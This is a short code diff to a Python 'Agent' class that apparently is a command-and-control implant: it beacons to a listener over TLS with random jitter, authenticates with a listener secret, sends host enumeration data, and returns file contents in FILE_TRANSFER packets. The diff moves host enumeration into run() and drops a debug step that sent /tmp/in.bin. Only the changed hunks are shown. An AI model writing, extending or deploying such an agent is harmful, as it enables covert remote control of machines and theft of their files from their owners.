@@ -33,6 +33,7 @@ class Agent:
     def __init__(self):
         self.ssock = None
         self.uuid = self.get_uuid()
+        self.enumdata = None
 
     def init_socket(self):
         context = ssl.create_default_context()
@@ -142,7 +143,7 @@ class Agent:
         associate_packet_stub = {
             "secret": _LISTENER_SECRET,
             "uuid": self.uuid,
-            "enumdata": self.enum_host(),
+            "enumdata": self.enumdata,
         }
         associate_pkt = "_associate" + json.dumps(associate_packet_stub)
         return self.tls_transact_msg(associate_pkt)
@@ -166,7 +167,7 @@ class Agent:
             "status": "FILE_TRANSFER",
             "data": data,
             "offset": offset,
-            "filename": file
+            "filename": file,
         }
         response_pkt = "_response" + json.dumps(response_packet_stub)
         return self.tls_transact_msg(response_pkt)
@@ -258,6 +259,7 @@ class Agent:
             return False
 
     def run(self):
+        self.enumdata = self.enum_host()
         _AGENT_STATE_ENUM = 0
         while True:
             time.sleep(_AGENT_BEACON_INTERVAL + randrange(_AGENT_BEACON_JITTER))
@@ -291,6 +293,4 @@ if __name__ == "__main__":
     else:
         logging.debug("Launching agent")
         agent.write_pid_file()
-        agent.init_socket()
-        agent.send_file("/tmp/in.bin")
         agent.run()
